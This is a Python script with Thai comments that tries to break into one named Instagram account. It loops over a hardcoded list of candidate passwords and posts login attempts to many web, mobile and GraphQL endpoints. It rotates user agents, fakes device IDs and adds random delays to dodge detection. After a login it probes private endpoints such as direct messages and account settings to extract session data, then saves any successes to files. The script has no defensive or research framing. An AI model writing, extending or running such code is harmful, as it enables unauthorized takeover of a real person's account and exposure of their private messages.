#!/usr/bin/env python3
"""
Instagram Advanced API Bypass System
ระบบ bypass ขั้นสูงด้วย API manipulation และ session management

เป้าหมาย: จัดการกับ response pattern ใหม่ของ Instagram
{"user": true, "authenticated": false, "status": "ok"}
"""

import requests
import json
import time
import random
from datetime import datetime
import hashlib
import base64
import urllib.parse

class InstagramAdvancedAPIBypass:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://www.instagram.com"
        
        # รหัสผ่านที่ยืนยันแล้วว่าถูกต้อง
        self.valid_passwords = [
            "Fleming654", "Fleming786", "Fleming1004", 
            "Fleming1060", "Fleming1182", "Fleming1998"
        ]
        
        # API endpoints for testing
        self.endpoints = {
            # Web endpoints
            'web_login': '/api/v1/web/accounts/login/ajax/',
            'web_profile': '/api/v1/users/web_profile_info/',
            'web_session': '/api/v1/web/sessions/login/',
            
            # Mobile endpoints
            'mobile_login': '/api/v1/accounts/login/',
            'mobile_create': '/api/v1/accounts/create/',
            'mobile_verify': '/api/v1/accounts/send_verify_email/',
            
            # Internal endpoints
            'graphql': '/api/graphql/',
            'qe_sync': '/api/v1/qe/sync/',
            'launcher_sync': '/api/v1/launcher/sync/',
            
            # Legacy endpoints
            'ajax_login': '/accounts/login/ajax/',
            'legacy_login': '/accounts/login/',
        }
        
        # User agents for rotation
        self.user_agents = [
            # Desktop browsers
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            
            # Mobile browsers
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0',
            
            # Instagram app
            'Instagram 123.0.0.21.114 Android (25/7.1.1; 480dpi; 1080x1920; samsung; SM-G950F; dreamlte; samsungexynos8895; en_US; 185203708)',
            'Instagram 123.0.0.21.114 iPhone12,1 (iOS 17_0; en_US; en-US; scale=2.00; 828x1792; 185203708)'
        ]
        
    def get_fresh_session(self):
        """สร้าง session ใหม่พร้อม headers"""
        self.session.close()
        self.session = requests.Session()
        
        # เลือก User-Agent แบบสุ่ม
        ua = random.choice(self.user_agents)
        
        # ตั้งค่า headers ขั้นพื้นฐาน
        self.session.headers.update({
            'User-Agent': ua,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        })
        
        print(f"🔄 New session with UA: {ua[:50]}...")
        return ua
    
    def get_csrf_token_advanced(self):
        """ดึง CSRF token ด้วยวิธีขั้นสูง"""
        methods = [
            self.csrf_from_main_page,
            self.csrf_from_login_page,
            self.csrf_from_api_endpoint,
            self.csrf_from_mobile_page,
            self.csrf_from_graphql
        ]
        
        for i, method in enumerate(methods, 1):
            print(f"🔑 CSRF method {i}...")
            try:
                token = method()
                if token:
                    print(f"✅ CSRF obtained via method {i}: {token[:20]}...")
                    return token
            except Exception as e:
                print(f"❌ CSRF method {i} failed: {e}")
                continue
        
        return None
    
    def csrf_from_main_page(self):
        """วิธีที่ 1: CSRF จากหน้าหลัก"""
        response = self.session.get(self.base_url + "/")
        return self.session.cookies.get('csrftoken')
    
    def csrf_from_login_page(self):
        """วิธีที่ 2: CSRF จากหน้า login"""
        response = self.session.get(self.base_url + "/accounts/login/")
        return self.session.cookies.get('csrftoken')
    
    def csrf_from_api_endpoint(self):
        """วิธีที่ 3: CSRF จาก API endpoint"""
        response = self.session.get(self.base_url + "/api/v1/users/web_profile_info/?username=instagram")
        return self.session.cookies.get('csrftoken')
    
    def csrf_from_mobile_page(self):
        """วิธีที่ 4: CSRF จากหน้า mobile"""
        mobile_headers = {'User-Agent': 'Instagram 123.0.0.21.114 Android'}
        response = self.session.get(self.base_url + "/accounts/login/", headers=mobile_headers)
        return self.session.cookies.get('csrftoken')
    
    def csrf_from_graphql(self):
        """วิธีที่ 5: CSRF จาก GraphQL"""
        response = self.session.get(self.base_url + "/api/graphql/")
        return self.session.cookies.get('csrftoken')
    
    def test_endpoint_comprehensive(self, username, password, endpoint_name, endpoint_path):
        """ทดสอบ endpoint อย่างครอบคลุม"""
        print(f"\n🎯 Testing: {endpoint_name}")
        print(f"📍 Endpoint: {endpoint_path}")
        
        url = self.base_url + endpoint_path
        
        # เตรียม headers ตาม endpoint type
        headers = self.session.headers.copy()
        
        if 'mobile' in endpoint_name:
            headers.update({
                'User-Agent': 'Instagram 123.0.0.21.114 Android (25/7.1.1; 480dpi; 1080x1920; samsung; SM-G950F; dreamlte; samsungexynos8895; en_US; 185203708)',
                'X-IG-App-ID': '567067343352427',
                'X-IG-Android-ID': 'android-' + ''.join(random.choices('0123456789abcdef', k=16)),
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTv10=',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Language': 'en-US',
                'X-FB-HTTP-Engine': 'Liger'
            })
            data = self.prepare_mobile_data(username, password)
            
        elif 'graphql' in endpoint_name:
            headers.update({
                'Content-Type': 'application/json',
                'X-FB-LSD': 'AVqbxe3J_YA',
                'X-ASBD-ID': '129477',
            })
            data = self.prepare_graphql_data(username, password)
            
        else:
            # Web endpoint
            csrf_token = self.get_csrf_token_advanced()
            if csrf_token:
                headers.update({
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-CSRFToken': csrf_token,
                    'X-Instagram-AJAX': '1',
                    'X-IG-App-ID': '936619743392459',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://www.instagram.com',
                    'Referer': 'https://www.instagram.com/accounts/login/',
                })
                data = self.prepare_web_data(username, password)
            else:
                print("❌ No CSRF token available")
                return None
        
        try:
            # ส่ง request
            response = self.session.post(url, data=data, headers=headers, allow_redirects=False)
            
            result = {
                'endpoint': endpoint_name,
                'url': url,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'cookies': dict(response.cookies),
                'text_length': len(response.text),
                'text_sample': response.text[:200],
                'timestamp': datetime.now().isoformat()
            }
            
            # Parse JSON if possible
            try:
                json_data = response.json()
                result['json'] = json_data
                print(f"📄 JSON Response: {json_data}")
                
                # วิเคราะห์ response pattern
                if self.analyze_response_for_breakthrough(json_data):
                    result['breakthrough'] = True
                    print("🎉 POTENTIAL BREAKTHROUGH!")
                    
            except json.JSONDecodeError:
                result['json'] = None
                print(f"📄 Non-JSON Response: {response.text[:100]}...")
            
            # ตรวจสอบ redirect
            if response.status_code in [301, 302]:
                location = response.headers.get('location', '')
                result['redirect'] = location
                print(f"🔄 Redirect to: {location}")
                
                if any(success_indicator in location for success_indicator in ['dashboard', 'feed', 'profile']):
                    result['potential_success'] = True
                    print("🎉 POTENTIAL SUCCESS REDIRECT!")
            
            return result
            
        except Exception as e:
            print(f"❌ Request failed: {e}")
            return {'error': str(e), 'endpoint': endpoint_name}
    
    def prepare_web_data(self, username, password):
        """เตรียมข้อมูลสำหรับ web login"""
        return {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}'
        }
    
    def prepare_mobile_data(self, username, password):
        """เตรียมข้อมูลสำหรับ mobile login"""
        device_id = 'android-' + ''.join(random.choices('0123456789abcdef', k=16))
        return {
            'username': username,
            'password': password,
            'device_id': device_id,
            'login_attempt_count': '0',
            '_csrftoken': self.session.cookies.get('csrftoken', ''),
            'guid': device_id,
            'phone_id': ''.join(random.choices('0123456789abcdef-', k=36)),
            'adid': ''.join(random.choices('0123456789abcdef-', k=36)),
        }
    
    def prepare_graphql_data(self, username, password):
        """เตรียมข้อมูลสำหรับ GraphQL"""
        return json.dumps({
            'variables': {
                'username': username,
                'password': password
            },
            'query': 'mutation LoginMutation($username: String!, $password: String!) { login(username: $username, password: $password) { success } }'
        })
    
    def analyze_response_for_breakthrough(self, json_data):
        """วิเคราะห์ response เพื่อหา breakthrough"""
        if not json_data:
            return False
        
        # ตรวจสอบ positive indicators
        positive_indicators = [
            json_data.get('authenticated') == True,
            json_data.get('logged_in') == True,
            json_data.get('success') == True,
            'sessionid' in str(json_data).lower(),
            'session' in json_data and json_data['session'],
            'token' in json_data and json_data['token'],
            'user_id' in json_data,
            'pk' in json_data
        ]
        
        return any(positive_indicators)
    
    def session_extraction_attempt(self, username, password):
        """พยายามสกัด session หลังจาก partial authentication"""
        print(f"\n🎭 Session extraction attempt for: {username}/{password}")
        
        # ขั้นตอนที่ 1: ทำ login เพื่อได้ partial session
        login_result = self.test_endpoint_comprehensive(username, password, 'web_login', '/api/v1/web/accounts/login/ajax/')
        
        if not login_result or login_result.get('json', {}).get('user') != True:
            print("❌ No valid user response")
            return False
        
        print("✅ Valid user confirmed, attempting session extraction...")
        
        # ขั้นตอนที่ 2: ลองเข้า protected endpoints
        protected_endpoints = [
            ('/api/v1/accounts/current_user/', 'Current User'),
            ('/api/v1/feed/timeline/', 'Timeline'),
            ('/api/v1/direct_v2/inbox/', 'Direct Messages'),
            ('/api/v1/users/self/', 'Self Profile'),
            (f'/api/v1/users/web_profile_info/?username={username}', 'Profile Info'),
            ('/api/v1/notifications/badge/', 'Notifications'),
            ('/accounts/edit/', 'Account Settings')
        ]
        
        for endpoint, name in protected_endpoints:
            try:
                print(f"🔍 Testing: {name}")
                response = self.session.get(self.base_url + endpoint)
                
                print(f"📊 {name}: Status {response.status_code}, Length {len(response.text)}")
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'user' in data or 'pk' in data or len(str(data)) > 100:
                            print(f"🎉 POTENTIAL SESSION SUCCESS: {name}")
                            return {
                                'success': True,
                                'endpoint': endpoint,
                                'data': data,
                                'response_length': len(response.text)
                            }
                    except:
                        # Not JSON but maybe successful
                        if len(response.text) > 1000:
                            print(f"🎉 POTENTIAL SESSION SUCCESS (Non-JSON): {name}")
                            return {
                                'success': True,
                                'endpoint': endpoint,
                                'response_length': len(response.text),
                                'text_sample': response.text[:200]
                            }
                
                time.sleep(random.uniform(1, 2))
                
            except Exception as e:
                print(f"❌ {name} failed: {e}")
        
        return False
    
    def run_advanced_api_bypass(self):
        """รันการ bypass ด้วย API ขั้นสูง"""
        print("🚀 Starting Advanced API Bypass System")
        print("🎯 Target: alx.trading")
        print("=" * 60)
        
        username = "alx.trading"
        results = []
        
        for i, password in enumerate(self.valid_passwords, 1):
            print(f"\n📋 ADVANCED API TEST {i}/{len(self.valid_passwords)}")
            print(f"Password: {password}")
            print("=" * 50)
            
            # สร้าง session ใหม่
            self.get_fresh_session()
            
            password_results = {
                'password': password,
                'timestamp': datetime.now().isoformat(),
                'endpoint_tests': [],
                'session_extraction': None
            }
            
            # ทดสอบทุก endpoints
            for endpoint_name, endpoint_path in self.endpoints.items():
                print(f"\n🔍 Testing endpoint: {endpoint_name}")
                
                result = self.test_endpoint_comprehensive(username, password, endpoint_name, endpoint_path)
                if result:
                    password_results['endpoint_tests'].append(result)
                    
                    # ตรวจสอบ breakthrough
                    if result.get('breakthrough') or result.get('potential_success'):
                        print(f"🎉 BREAKTHROUGH DETECTED in {endpoint_name}!")
                        
                        # บันทึก breakthrough
                        breakthrough_file = f"API_BREAKTHROUGH_{endpoint_name}_{password}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                        with open(breakthrough_file, 'w') as f:
                            json.dump(result, f, indent=2)
                        print(f"💾 Breakthrough saved to: {breakthrough_file}")
                
                # หน่วงเวลาระหว่าง endpoint
                time.sleep(random.uniform(1, 3))
            
            # ลอง session extraction
            print(f"\n🎭 Session Extraction Phase")
            session_result = self.session_extraction_attempt(username, password)
            password_results['session_extraction'] = session_result
            
            if session_result and session_result.get('success'):
                print(f"🎉 SESSION EXTRACTION SUCCESS!")
                
                # บันทึก session success
                session_file = f"SESSION_SUCCESS_{password}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(session_file, 'w') as f:
                    json.dump(session_result, f, indent=2)
                print(f"💾 Session success saved to: {session_file}")
            
            results.append(password_results)
            
            # หน่วงเวลาระหว่าง password
            if i < len(self.valid_passwords):
                wait_time = random.uniform(5, 10)
                print(f"⏱️ Waiting {wait_time:.1f} seconds...")
                time.sleep(wait_time)
        
        # บันทึกผลลัพธ์รวม
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        results_file = f"advanced_api_bypass_results_{timestamp}.json"
        
        with open(results_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print(f"\n💾 All results saved to: {results_file}")
        
        # สรุปผลลัพธ์
        total_endpoints = len(self.endpoints) * len(self.valid_passwords)
        breakthrough_count = sum(
            len([r for r in pwd['endpoint_tests'] if r.get('breakthrough') or r.get('potential_success')])
            for pwd in results
        )
        session_success_count = sum(1 for pwd in results if pwd.get('session_extraction', {}).get('success'))
        
        print(f"\n📊 ADVANCED API BYPASS SUMMARY")
        print("=" * 60)
        print(f"🎯 Total endpoint tests: {total_endpoints}")
        print(f"🔍 Breakthrough responses: {breakthrough_count}")
        print(f"🎭 Session extraction successes: {session_success_count}")
        print(f"📊 Overall success rate: {((breakthrough_count + session_success_count) / len(self.valid_passwords) * 100):.1f}%")
        
        return results

if __name__ == "__main__":
    bypass_system = InstagramAdvancedAPIBypass()
    results = bypass_system.run_advanced_api_bypass()
